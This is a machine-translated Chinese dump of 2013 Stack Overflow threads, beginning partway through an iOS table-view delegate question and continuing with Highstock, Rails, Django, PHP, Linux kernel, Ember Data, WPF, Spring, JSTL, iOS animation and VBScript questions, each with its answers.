@property (weak, nonatomic) IBOutlet UIImageView *ImgWeather;

@property (weak, nonatomic) IBOutlet UIButton *btnMap;

@property (weak, nonatomic) IBOutlet UILabel *LabelWeather;

@property (weak, nonatomic) IBOutlet UILabel *LabelWeather2;

@end

@implementation GuideTableViewController

//Weather method

- (void) loadWeather{

    NSURLRequest *theRequest = [NSURLRequest requestWithURL:
                                [NSURL  URLWithString:@"http://api.wunderground.com/api/3919480da5014c98/conditions/q/BR/Sao_Sebastiao .json"]];
    NSURLConnection *theConnection=[[NSURLConnection alloc]
                                initWithRequest:theRequest delegate:self];
    if(theConnection){
        weatherResponseData = [[NSMutableData alloc] init];
    } else {
        NSLog(@"failed");
    }
}

//Delegates for WeatherData

- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse  *)response
{
    [weatherResponseData setLength:0];
}

- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data
{
    [weatherResponseData appendData:data];
}

- (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error
{
    NSString *msg = [NSString stringWithFormat:@"Failed: %@", [error description]];
    NSLog(@"%@",msg);
}

- (void)connectionDidFinishLoading:(NSURLConnection *)connection
{
    NSError *myError = nil;
    NSDictionary *res = [NSJSONSerialization JSONObjectWithData:weatherResponseData options:NSJSONReadingMutableLeaves  error:&myError];
    NSArray *results =  [res objectForKey:@"current_observation"];
    NSString *cur = [results valueForKey:@"weather"];
    NSString *tmp = [results valueForKey:@"temperature_string"];
    NSString *wind = [results valueForKey:@"wind_string"];

    NSLog(@"Current conditions: %@, %@º, %@", cur, tmp, wind);

    self.LabelWeather.text = cur;

    self.LabelWeather2.text = tmp;
}

//JSONmethod

- (void) loadJSON{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        //code
        NSData *data = [NSData dataWithContentsOfURL:[NSURL URLWithString:@"https://dl.dropbox.com/u/100670549/guide.json"]];

        NSError *error;

        if (data)
         {
            headGuide = [NSJSONSerialization JSONObjectWithData:data options:0 error:&error];

            for (NSDictionary *dictionary in headGuide){
               // NSLog([dictionary description]);
            }

        }else
        {
             NSLog(@"Could not load data");
        }

        dispatch_sync(dispatch_get_main_queue(), ^{
             // code

            [self.tableView reloadData];
        });
    });
}

//Load

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view.

    [self loadJSON];
    [self loadWeather];

    leftImages = [NSArray arrayWithObjects:@"btn_Stay.png", @"btn_Eat.png", @"btn_Todo.png", nil];

    // set background
    self.view.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"background.jpg"]];

    // rounded corners

    [self.tableView.layer setCornerRadius:9.0];

    [self.ImgWeather.layer setCornerRadius:9.0];
}

#pragma mark - Table view data source

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    // Return the number of sections.
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    // Return the number of rows in the section.
    return headGuide.count;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"Cell"];

    NSArray *dict = [headGuide objectAtIndex:indexPath.row];

    cell.textLabel.text = [dict valueForKey:@"title"];

    NSString *cellImage = [leftImages objectAtIndex:indexPath.row];
    UIImage *cellIcon = [UIImage imageNamed:cellImage];

    cell.imageView.image = cellIcon;

    return cell;
}

- (void) prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender{
    if ([segue.identifier isEqualToString:@"whereStay"]){
        GuideDetailTableViewController *vc = [segue destinationViewController];
        NSIndexPath *index = sender;
        NSDictionary *dict = [headGuide objectAtIndex:index.row];
        vc.stayGuide = dict;
    }
    else if ([segue.identifier isEqualToString:@"whereEat"]){
         GuideDetailTableViewController2 *vc1 = [segue destinationViewController];
         NSIndexPath *index = sender;
         NSDictionary *dict = [headGuide objectAtIndex:index.row];
        vc1.eatGuide = dict;
    }
    else if ([segue.identifier isEqualToString:@"whatTodo"]){
        GuideDetailTableViewController3 *vc2 = [segue destinationViewController];
        NSIndexPath *index = sender;
        NSDictionary *dict = [headGuide objectAtIndex:index.row];
        vc2.todoGuide = dict;
    }
}

#pragma mark - tableView delegate

- (void)tableView:(UITableView *)tableView didselectRowAtIndexPath:(NSIndexPath       *)indexPath{
    if(indexPath.row == 0){
        [self performSegueWithIdentifier:@"whereStay" sender:indexPath];
    }else if(indexPath.row ==1 ){
        [self performSegueWithIdentifier:@"whereEat" sender:indexPath];
    }else{
         [self performSegueWithIdentifier:@"whatTodo" sender:indexPath];
     }

    [tableView setAllowsSelection:YES];
}

@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:50:41.867

您的方法签名也没有正确大写：

```
- (void)tableView:(UITableView *)tableView didselectRowAtIndexPath:(NSIndexPath       *)indexPath{ 
```

应该

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath       *)indexPath{ 
```

方法名称区分大小写。

此外，请确保您将 tableView 的委托设置为

```
self.tableView.delegate = self; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:20:32.183

您似乎没有将此对象设置为表视图的委托。在您的`-viewDidLoad`方法中，您应该调用`[[self tableView] setDelegate:self];`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T23:13:28.470

您的 tableview 委托和数据源协议在哪里？

```
@interface GuideTableViewController : UIViewController <UITableViewDataSource,UITableViewDelegate>
{
//Attributes...
IBOutlet UITableView *tableView;
} 
```

在 viewDidLoad 中，您应该设置委托：

```
tableView.delegate = self;
tableView.dataSource = self; 
```

您还可以在 xib 文件中设置代表...

所以你的代表方法应该有效......查看关于tableview的苹果文档：http: [//developer.apple.com/library/ios/#documentation/uikit/reference/UITableView_Class/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITableView_Class/Reference/Reference.html)

# highcharts - 有没有办法在不使用 PHP 的情况下将数据加载到 Highstock 中？

> ID：14903346
> 
> 赞同：2
> 
> 时间：2013-02-15T21:08:26.207
> 
> 标签：highcharts, highstock

3 天来，我一直在努力尝试将数据加载到 Highstock 图表中的所有三种方法。有没有办法在不使用 PHP 的情况下导入数据？我在没有安装 PHP 的 IIS 服务器上。

当我使用指向[http://www.highcharts.com/samples/data/jsonp.php](http://www.highcharts.com/samples/data/jsonp.php)的 $j.getJSON() 方法时， 它工作正常。但是，当我开始尝试添加自己的数据时（我尝试了 CSV 和 XML），我可以通过 firebug 控制台看到一切运行都没有问题，但我得到了一个奇怪的结果。

[http://i.imgur.com/qj5y8bM.png](http://i.imgur.com/qj5y8bM.png)

我可以获取一个 Stockchart 图表的样本（3 个绘图点）吗？我能找到的所有样本都是针对 Highchart Barchart 的。这与我使用 StockChart 所做的完全不同。请，我需要一个示例 CSV 和示例 JSON 来作为基础。有人请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T23:36:52.150

看看[文档](http://docs.highcharts.com/#preprocesssing-data-from-a-file)，有一些演示和说明如何做到这一点。

**首先**，创建 csv。

```
Categories,Apples,Pears,Oranges,Bananas
John,8,4,6,5
Jane,3,4,2,3
Joe,86,76,79,77
Janet,3,16,13,15 
```

**其次**，定义基本图表选项。

```
var options = {
    chart: {
        renderTo: 'container',
        defaultSeriesType: 'column'
    },
    title: {
        text: 'Fruit Consumption'
    },
    xAxis: {
        categories: []
    },
    yAxis: {
        title: {
            text: 'Units'
        }
    },
    series: []
}; 
```

**第三**，处理数据。

```
$.get('data.csv', function(data) {
    // Split the lines
    var lines = data.split('\n');

    // Iterate over the lines and add categories or series
    $.each(lines, function(lineNo, line) {
        var items = line.split(',');

        // header line containes categories
        if (lineNo == 0) {
            $.each(items, function(itemNo, item) {
                if (itemNo > 0) options.xAxis.categories.push(item);
            });
        }

        // the rest of the lines contain data with their name in the first position
        else {
            var series = {
                data: []
            };
            $.each(items, function(itemNo, item) {
                if (itemNo == 0) {
                    series.name = item;
                } else {
                    series.data.push(parseFloat(item));
                }
            });

            options.series.push(series);

        }

    });

    // Create the chart
    var chart = new Highcharts.Chart(options);
}); 
```

这[**是结果**](http://www.highcharts.com/studies/data-from-csv.htm)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T22:27:32.080

您应该能够使用数组或命名值对象将数据加载到 Highcharts/Highstock 对象中。highcharts.com 上的 PHP 示例 URL 返回 Highcharts/Highstock 可以理解的 JSON 数据，但您可以使用任何返回 JSON 数据的数据源。

例如，下面是一些使用简单数组存储系列数据的代码：

```
$(function() {
    window.chart = new Highcharts.StockChart({
        chart : {
            renderTo : 'container'
        },
        title : {
            text : 'My chart'
        },
        series : [{
            name : 'My Series',
            data : [
                [Date.UTC(2006, 0, 29, 0, 0, 0), 30.14],
                [Date.UTC(2006, 0, 29, 1, 0, 0), 34.76],
                [Date.UTC(2006, 0, 29, 2, 0, 0), 34.34],
                [Date.UTC(2006, 0, 29, 3, 0, 0), 33.9]
            ]
        }]
    });
}); 
```

这是一个现场样本：http: [//jsfiddle.net/fF9Ru/1/](http://jsfiddle.net/fF9Ru/1/)

如果您有现有的数据源，请发布它返回的数据示例。如果数据格式不正确，图表可能无法呈现。

# ruby-on-rails - 从父属性构建查询

> ID：14903350
> 
> 赞同：0
> 
> 时间：2013-02-15T21:08:38.607
> 
> 标签：ruby-on-rails, ruby, postgresql

从我尝试“缺少 FROM 子句条目”的查询中获取以下错误

基本上，我的问题有很多答案，我试图获得属于“x”类别问题的所有答案

```
Answer.joins(:question).
from('answers').
where(:question => {:category => @category}).
sort_by(&:created_at).
reverse.
paginate(:page => params[:page], :per_page => 20) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:39:55.660

尝试：

```
Answer.joins(:question => :category).where... 
```

怎么样：

```
Answer.joins(question: category).where("categories.name = ?", @category).order("answers.created at ASC").paginate(page: params[:page], per_page: 20) 
```

# django - 如何处理 create() 只需要 1 个参数（给定 7 个）

> ID：14903352
> 
> 赞同：0
> 
> 时间：2013-02-15T21:08:58.793
> 
> 标签：django

我正在创建一个像这样的对象， `OrderItem.objects.create(order,shopping_id=_shopping_id(request), quantity=quantity, item=i, created_by=anon_user, modified_by=anon_user)`

我收到此错误，`create() takes exactly 1 argument (7 given)` 我需要帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:15:32.617

尝试这个：

```
oi = OrderItem(shopping_id=_shopping_id(request), quantity=quantity, item=i, created_by=anon_user, modified_by=anon_user)
oi.save() 
```

我的回答基于此页面中的信息：[https ://docs.djangoproject.com/en/1.4/topics/db/queries/#creating-objects](https://docs.djangoproject.com/en/1.4/topics/db/queries/#creating-objects)

# php - 使用来自多维数组共享值的值创建新数组

> ID：14903358
> 
> 赞同：0
> 
> 时间：2013-02-15T21:09:17.093
> 
> 标签：php, arrays, multidimensional-array, foreach

我有这个多维数组：

```
array {
  [0]=>
  array(2) {
    [“foo”]=>
    int(138)
    [“bar”]=>
    int(127)
  }
  [1]=>
  array(2) {
    [“foo”]=>
    int(138)
    [“bar”]=>
    int(47)
  }
  [2]=>
  array(2) {
    [“foo”]=>
    int(138)
    [“bar”]=>
    int(13)
  }
  [3]=>
  array(2) {
    [“foo”]=>
    int(138)
    [“bar”]=>
    int(56)
  }
  [4]=>
  array(2) {
    [“foo”]=>
    int(154)
    [“bar”]=>
    int(77)
  }
  [5]=>
  array(2) {
    [“foo”]=>
    int(154)
    [“bar”]=>
    int(69)
  }
  [6]=>
  array(2) {
    [“foo”]=>
    int(154)
    [“bar”]=>
    int(70)
  }
  [7]=>
  array(2) {
    [“foo”]=>
    int(154)
    [“bar”]=>
    int(75) 
```

对于每个相同的 foo 值，我想创建一个新数组，其中 'foo' 是 $key，并且该数组中的每个对应的 'bar' 值（即：

```
array[138] {
    127
    47
    13
    56
} 
```

任何帮助都是极好的。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:16:08.460

好吧，这只是遍历数组。我真的不明白问题出在哪里。

```
$new =array();
for($i=0; $i<count($array); $i++) {
    if(!isset($new[$array[$i]["foo"]]))    //Check for existence of "foo" stack
      $new[$array[$i]["foo"]] = array();   //Create new array, where "bar"s will be put in
    $new[$array[$i]["foo"]][] = $array[$i]["bar"];  //Put "bar" in corresponding "foo" stack
} 
```

在这种情况下，您甚至可以使用 foreach，我避免使用它，以使代码示例对临时更改友好。
因为 OP 声明代码不起作用（即**lie**），[所以我做了一个示例](http://u8.8u.cz//crap/arraylooper1.php)。

# c++ - “BUG：原子时调度”的可能原因是什么？

> ID：14903360
> 
> 赞同：3
> 
> 时间：2013-02-15T21:09:25.840
> 
> 标签：c++, embedded-linux

还有另一个过程不断创建需要此代码处理的文件。此代码通过将文件系统的内容与包含处理结果的 sqlite 数据库（每个文件一个记录）进行比较，不断扫描文件系统以查找需要处理的新文件。该进程正在运行，`nice -n 19`以免干扰其他进程创建新文件。这一切都适用于大量（> 1k）文件，但随后会因`BUG: scheduling while atomic`. 据此[_](https://stackoverflow.com/questions/3537252/how-to-solve-bug-scheduling-while-atomic-swapper-0x00000103-0-cpu0-in-ts)

> “Scheduling while atomic”表示你试图睡在你不应该睡的地方

但是代码中唯一的sleep是这样的

```
void doFiles(void) {
    for (...) { // for each file in the file-system
        ... // check database - do processing if needed
    }
    sleep(1);
}
int main(int argc, char *argv[], char *envp[]) {
    while (true) doFiles();
    return -1;
} 
```

代码在针对数据库检查文件系统中的每个文件后将进入休眠状态。由于会不时添加新文件，因此需要重复该过程。此代码中没有多线程。除了错误的睡眠之外，还有其他可能导致“BUG：原子时调度”的原因吗？

编辑：附加错误输出：

```
note: mirlin[1083] exited with preempt_count 1
BUG: scheduling while atomic: mirlin/1083/0x40000002
Modules linked in: g_cdc_ms musb_hdrc nop_usb_xceiv irqk edmak dm365mmap cmemk
Backtrace: 
[<c002a5a0>] (dump_backtrace+0x0/0x110) from [<c028e56c>] (dump_stack+0x18/0x1c)
 r6:c1099460 r5:c04ea000 r4:00000000 r3:20000013
[<c028e554>] (dump_stack+0x0/0x1c) from [<c00337b8>] (__schedule_bug+0x58/0x64)
[<c0033760>] (__schedule_bug+0x0/0x64) from [<c028e864>] (schedule+0x84/0x378)
 r4:c10992c0 r3:00000000
[<c028e7e0>] (schedule+0x0/0x378) from [<c0033a80>] (__cond_resched+0x28/0x38)
[<c0033a58>] (__cond_resched+0x0/0x38) from [<c028ec6c>] (_cond_resched+0x34/0x44)
 r4:00013000 r3:00000001
[<c028ec38>] (_cond_resched+0x0/0x44) from [<c0082f64>] (unmap_vmas+0x570/0x620)
[<c00829f4>] (unmap_vmas+0x0/0x620) from [<c0085c10>] (exit_mmap+0xc0/0x1ec)
[<c0085b50>] (exit_mmap+0x0/0x1ec) from [<c0037610>] (mmput+0x40/0xfc)
 r9:00000001 r8:80000005 r6:c04ea000 r5:00000000 r4:c0427300
[<c00375d0>] (mmput+0x0/0xfc) from [<c003b5e4>] (exit_mm+0x150/0x158)
 r5:c10992c0 r4:c0427300
[<c003b494>] (exit_mm+0x0/0x158) from [<c003cd44>] (do_exit+0x198/0x67c)
 r7:c03120d1 r6:c10992c0 r5:0000000b r4:c10992c0
... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T23:34:40.340

正如其他人所说，您可以随时在用户代码中 sleep() 。

您的平台上的驱动程序似乎有问题。驱动程序实际上可能不会调用 sleep() 或 schedule()，但它通常会调用内核函数，而内核函数又会调用其中一个。

这看起来也像是在嵌入式 TI ARM 处理器上使用内存映射文件 I/O。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-02-20T13:11:36.073

此错误是由错误的构建引起的。一个干净的构建本身并没有帮助。需要重新签出和构建才能解决此问题。

# ember.js - Ember.js 数据如何清除数据存储区

> ID：14903361
> 
> 赞同：10
> 
> 时间：2013-02-15T21:09:26.517
> 
> 标签：ember.js, ember-data

我正在使用 Ember.js 进行实验，并设置了一个小应用程序，用户可以在其中登录和注销。当用户注销时，我想清除数据存储中当前缓存的所有记录。有没有办法做到这一点，还是我必须强制浏览器重新加载页面？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2015-07-16T15:11:36.370

我知道这个问题是从 2013 年开始的。但是自从 Ember Data 1.0.0-beta.17（2015 年 5 月 10 日）以来，有一种清除数据存储的简单方法：

`store.unloadAll()`

（更多信息：http: [//emberigniter.com/clear-ember-data-store/](http://emberigniter.com/clear-ember-data-store/)）

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-06-25T14:51:17.433

看起来，截至今天，仍然没有完全强制商店清理的通用方法。最简单的解决方法似乎是遍历所有类型（`person`，...）并执行以下操作：

```
store.unloadAll('person'); 
```

[如此处](http://discuss.emberjs.com/t/clear-data-store/3577)所见

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-17T18:20:14.643

Ember-Data 尚不支持清除数据存储。Github 跟踪器上有一个[关于此的未解决问题。](https://github.com/emberjs/data/issues/235)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-10-16T16:50:25.623

更清洁和通用的方法。只需扩展或重新打开商店并添加这样的清晰方法即可。

```
DS.Store.extend({
   clear: function() {
    for(var key in this.typeMaps)
    {
      this.unloadAll(this.typeMaps[key].type);
    }
  }
});
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-11-15T07:17:10.507

有：

```
App.reset(); 
```

但这[不仅仅是清除数据存储](http://emberjs.com/api/classes/Ember.Application.html#method_reset)，我们偶尔会看到`store.pushPayload`尝试将数据推送到标记为从调用中销毁的对象上的错误`App.reset();`。

我们一直在使用：

```
store.init(); 
```

这只是创建了一个新的空商店并且效果很好，但**不幸的是它是一种私有方法**。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-03-18T06:13:17.200

现在可以使用`store.destroy()`. 它会卸载所有记录，但也可以立即用于重新加载新记录。我已经确认了这一点`1.0.0-beta.15`。它似乎不在文档中，但它一直在为我工作。

另一种方法是迭代 store's `typeMaps`and running `store.unloadAll(typeMap.typeName)`，但我不确定这是否完全必要。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-08-09T03:16:42.177

删除模型中的记录。[这个](http://jsbin.com/iwiruw/367/edit)`deleteOrgs`jsBin ：

```
deleteOrgs: function(){
  var len;
  while(len = this.get('model.length')) {
    // must delete the last object first because 
    // this.get('model.length') is a live array
    this.get('model').objectAt(len-1).deleteRecord();
  }
  this.get('store').commit();
} 
```

（截至 2013 年 8 月，目前存在[延迟删除数据的问题](https://stackoverflow.com/questions/18135004/after-localstorage-clear-or-deleterecord-in-my-ember-js-app-local-storage-d)。）

# .net - 通过分页放置流文档时保持绑定

> ID：14903362
> 
> 赞同：4
> 
> 时间：2013-02-15T21:09:44.410
> 
> 标签：.net, wpf, .net-4.0, reporting

我一直在尝试在 .NET 4 中的 WPF 中构建一个简单的报告和打印系统，经过无数小时的拖网 SO 和各种在线教程，我有以下（简化的）设置，应该采用包含报告模板的流文档，添加一个数据源作为数据上下文，通过分页并最终得到可以显示/打印的东西。

报告在单独的内容文件 (DefaultReport.xaml) 中的流文档中进行布局：

```
<FlowDocument xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
              xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <Paragraph FontFamily="Arial">
        <Run Text="1"/>        
        <Run Text="{Binding Path=MyText}"/>
        <Run Text="3"/>        
    </Paragraph>
</FlowDocument> 
```

datacontext 是一个简单的对象：

```
private class MyDataContext {
    public string MyText { get; set; }
} 
```

这是像这样加载并放在一起的：

```
using (var stream = File.OpenRead("DefaultReport.xaml")) {
    FlowDocument document = (FlowDocument)XamlReader.Load(stream);                
    document.DataContext = new MyDataContext { MyText = "2" };

    flowReader.Document = document;           

    XpsDocument xpsDoc = LoadAsXPS(((IDocumentPaginatorSource)document).DocumentPaginator);
    fixedReader.Document = xpsDoc.GetFixedDocumentSequence();
    xpsDoc.Close();
} 
```

LoadAsXPS 将流文档转换为 XpsDocument，如下所示：

```
public XpsDocument LoadAsXPS(DocumentPaginator paginator) {
     MemoryStream stream = new MemoryStream();
     Package docPackage = Package.Open(stream, FileMode.Create, FileAccess.ReadWrite);

     Uri uri = new Uri(@"memorystream://myXps.xps");
     PackageStore.AddPackage(uri, docPackage);
     XpsDocument xpsDoc = new XpsDocument(docPackage);

     xpsDoc.Uri = uri;
     XpsDocument.CreateXpsDocumentWriter(xpsDoc).Write(paginator);

     return xpsDoc;
 } 
```

flowReader 和 fixedReader 输出整个操作的结果，在 xaml 中定义为

```
 <FlowDocumentReader Name="flowReader" />
 <DocumentViewer Margin="0,10,0,0" Name="fixedReader" /> 
```

最终结果如下：

![在此处输入图像描述](../Images/ee4efcb3aa4100ebb3537c5d1e24cea5.png)

上半部分是我用于调试的 FlowDocumentReader。这里一切正常。下半部分是包含我的分页文档的 DocumentViewer，这是我正常工作所需要的。

如何通过分页过程保留绑定数据*？*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-18T23:11:28.500

我在设置赏金后 10 分钟想通了。数字。

显然，在分配流文档数据上下文后，调度程序需要一点推动才能使事情顺利进行：

```
this.Dispatcher.Invoke(DispatcherPriority.SystemIdle, new Action(() => { })); 
```

# java - Spring：基于注释的配置期间@import文件中的引用bean

> ID：14903364
> 
> 赞同：2
> 
> 时间：2013-02-15T21:10:12.277
> 
> 标签：java, spring, configuration, annotations

我有两个spring配置类A和B。B中的bean使用@import注释在A中导入，像这样

```
@Configuration
@Import({B.class})
public class A {
    private BBean bbean;

    @Bean
    public ABean aBean() {
        // need to reference B's bean over here
        return aBean()// after referencing B's bean
    }
}

@Configuration
public class B {
    @Bean
    public BBean bBean(){
       return new BBean();        
    }
} 
```

在创建 bean aBean 时如何引用 bean bBean？有人会认为 @Required 或 @Autowired 可以在这里工作，但它不会:(

**更新 - 我在这里尝试做的是使用 TestNG 和 maven 运行单元测试。当我尝试引用“Autowired”bean 时，maven 挂起，可能处于无限循环或等待加载 bean。**

```
-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running TestSuite
13:15:42,427  INFO eans.factory.xml.XmlBeanDefinitionReader: 315 - Loading XML bean definitions from class path resource [META-INF/spring/app-context.xml]
13:15:42,589  INFO nnotation.ClassPathBeanDefinitionScanner: 210 - JSR-330 'javax.inject.Named' annotation found and supported for component scanning
13:15:42,671  INFO ontext.support.GenericApplicationContext: 495 - Refreshing org.springframework.context.support.GenericApplicationContext@45d6a56e: startup date [Fri Feb 15 13:15:42 PST 2013]; root of context hierarchy
13:15:42,769  INFO ctory.support.DefaultListableBeanFactory: 623 - Overriding bean definition for bean 'dataSource': replacing [Root bean: class [null]; scope=; abstract=false; lazyInit=false; autowireMode=3; dependencyCheck=0; autowireCandidate=true; primary=false; factoryBeanName=repositoryConfig; factoryMethodName=dataSource; initMethodName=null; destroyMethodName=(inferred); defined in class path resource [com/abc/pagg/ddee/repository/config/RepositoryConfig.class]] with [Root bean: class [null]; scope=; abstract=false; lazyInit=false; autowireMode=3; dependencyCheck=0; autowireCandidate=true; primary=false; factoryBeanName=serviceConfig; factoryMethodName=dataSource; initMethodName=null; destroyMethodName=(inferred); defined in class path resource [com/abc/pagg/ddee/service/config/ServiceConfig.class]]
13:15:42,983  INFO ion.AutowiredAnnotationBeanPostProcessor: 139 - JSR-330 'javax.inject.Inject' annotation found and supported for autowiring
13:15:43,027  INFO ctory.support.DefaultListableBeanFactory: 557 - Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@66b51404: defining beans [org.springframework.context.annotation.internalConfigurationAnnotationProcessor,org.springframework.context.annotation.internalAutowiredAnnotationProcessor,org.springframework.context.annotation.internalRequiredAnnotationProcessor,org.springframework.context.annotation.internalCommonAnnotationProcessor,serviceConfig,org.springframework.aop.config.internalAutoProxyCreator,org.springframework.transaction.annotation.AnnotationTransactionAttributeSource#0,org.springframework.transaction.interceptor.TransactionInterceptor#0,org.springframework.transaction.config.internalTransactionAdvisor,transactionManager,sqlSessionFactory,org.mybatis.spring.mapper.MapperScannerConfigurer#0,org.springframework.context.annotation.ConfigurationClassPostProcessor$ImportAwareBeanPostProcessor#0,commonConfig,propertiesConfig,repositoryConfig,iusRestManager,localCacheClientAdapter,memcachedClientAdapter,s3Adapter,dataSource,userMapper]; root of factory hierarchy  <<--- hangs right here 
```

**更新 - 这里的真实代码**

```
@Configuration
@Import({CommonConfig.class})
public class ServiceConfig {
private final Logger log = LoggerFactory.getLogger(ServiceConfig.class);
private org.apache.commons.configuration.Configuration propertiesConfig;

@Autowired
public void setPropertiesConfig(org.apache.commons.configuration.Configuration propertiesConfig){
    this.propertiesConfig = propertiesConfig;
}

public ServiceConfig() {
}

@Bean
public DataSource dataSource() {
    final BasicDataSource dataSource = new BasicDataSource();
 --->   dataSource.setDriverClassName(propertiesConfig.getString("jdbc.driver")); <----
    //dataSource.setUrl(propertiesConfig.getString("jdbc.url"));
    //dataSource.setUsername(propertiesConfig.getString("jdbc.username"));
    //dataSource.setPassword(propertiesConfig.getString("jdbc.password"));

    return dataSource;
} 
```

bean propertiesConfig 在 CommonConfig 中定义。我在突出显示的行上得到一个 invocationTargetException，因为 propertiesConfig 为空。dataSource bean 不断在循环中实例化。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:20:01.270

在您描述的情况下`@Import`应使用的提及文档：`@Autowired`

> 在导入的@Configuration 类中声明的@Bean 定义应该使用@Autowired 注入来访问。bean 本身可以自动装配，或者声明 bean 的配置类实例可以自动装配。后一种方法允许在 @Configuration 类方法之间进行显式的、IDE 友好的导航。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T02:48:19.747

这不是`@Autowired`导致您的问题的原因。从您遇到的问题来看，我希望您有一个 bean，它在启动时做了一些没有及时完成的​​事情。由于 bean 的初始化从未完成，因此 Spring 无法继续启动。某种网络通信很可能是最有可能的，因为它们有一个坏习惯，就是无限期挂起没有输出，除非另有特别配置。在 JVM 挂起时提取堆栈转储，并查看您的线程在做什么。否则，附加一个调试器，并手动暂停 JVM 以获得相同的效果。

# java - 使用 JSTL 访问枚举值？

> ID：14903365
> 
> 赞同：2
> 
> 时间：2013-02-15T21:10:28.230
> 
> 标签：java, el

好的，我有一个名为 FiscalMonth 的枚举：

```
Oct(1), 
Nov(2), 
Dec(3), 
Jan(4), 
Feb(5), 
Mar(6), 
Apr(7), 
May(8), 
Jun(9), 
Jul(10), 
Aug(11), 
Sep(12); 
```

我需要访问 JSTL 中的 # ......现在......我只是像这样操作字符串......

```
<c:forEach var="month" items="${monthList}" end="11">

<c:choose>
    <c:when test="${fn:substring(month,0,1) == 'O'}">
        "${fn:substring(month,0,1)}${fn:substring(year,2,4)}", "tooltext": "${month} ${year}}"});
    </c:when>
    <c:otherwise>
        "${fn:substring(month,0,1)}", "tooltext": "${month} "});
    </c:otherwise>
</c:choose> 
```

我怎样才能抓住枚举#的？谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-15T21:17:10.890

如果您可以修改`FiscalMonth`该类，请添加一个称为`getNumber()`返回月份编号的方法。然后您可以像这样访问 EL 中的月份编号：`${month.number}`. 您也可以将`getNumber()`and`month.number`替换为`getWhatever()`and `month.whatever`。

带回家的信息是枚举类型几乎是任何其他类。它们可以有方法、实例变量等。

# ios - 使用 animateWithDuration 动画非常难以预测

> ID：14903367
> 
> 赞同：0
> 
> 时间：2013-02-15T21:10:45.460
> 
> 标签：ios, xcode, cocoa-touch, uiview, uikit

很多人都问过这个问题，但我还没有真正找到答案。

我有一些课程在许多其他带有动画的方法中

```
someClass.m
@implementation

////..

-(void) someAnimationWithSomeObject (someParameters...blablabla

    [UIView animateWithDuration:0.2f
                          delay:delay
                        options:UIViewAnimationOptionCurveEaseOut
                     animations:^
     {
         self.center = point;
         self.transform = CGAffineTransformMakeRotation(_angle);
     }
                     completion:nil)]; 
```

在视图控制器中

```
-(void) someMethod1 {
/.....

for (int i=0; i < count; i++) {

/...some operation with coordinates

        [self.cardContainer addSubview:someView];

        [someView someAnimationWithSomeObject:someParameters withDelay:delay];
        delay += 0.2f; 
/... } 
```

[self someMethod2];

```
}

-(void) someMethod2 {
/.....

for (int i=0; i < count; i++) {

/...some operation with coordinates

        [self.cardContainer addSubview:someView];

        [someView someAnimationWithSomeObject:someParameters withDelay:delay];
        delay += 0.2f; 
/... }

}

- (void)viewDidLoad
{
    [super viewDidLoad];

    [self someMethod1];

} 
```

当我使用这段代码时动画是非常不可预测的，因为当调用`someMethod2`坐标计算时动画是最快的。

如何使动画在第一种方法中播放，然后在第二种方法中播放等等。

**[解决了]**

在 someMethod1 添加之后

```
 [self performSelector:@selector(someMethod2) withObject:nil afterDelay:delay]; 
```

并且需要延迟修正 + 或 -

做得很好！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T04:18:49.020

考虑在第一个的完成块中启动第二个方法。也就是说，“做这个动画；然后，当它完成时，调用`someMethod2`并开始下一个动画。

# recursion - VBS：递归中的 FileSystemObject 使用

> ID：14903372
> 
> 赞同：1
> 
> 时间：2013-02-15T21:10:55.270
> 
> 标签：recursion, vbscript, filesystemobject

目前，我正在编写一个脚本，该脚本将遍历给定文件夹并搜索具有特定扩展名的所有文件。然后它将打印出名称并汇总文件大小。我相信我已经解决了大部分问题，所以这个问题不是关于如何做到这一点。

相反，我想知道在递归函数中使用 FileSystemObject 流的最佳实践是什么。我应该为所有调用（全局或传递）使用单个流，还是应该为每个递归步骤创建一个新流？

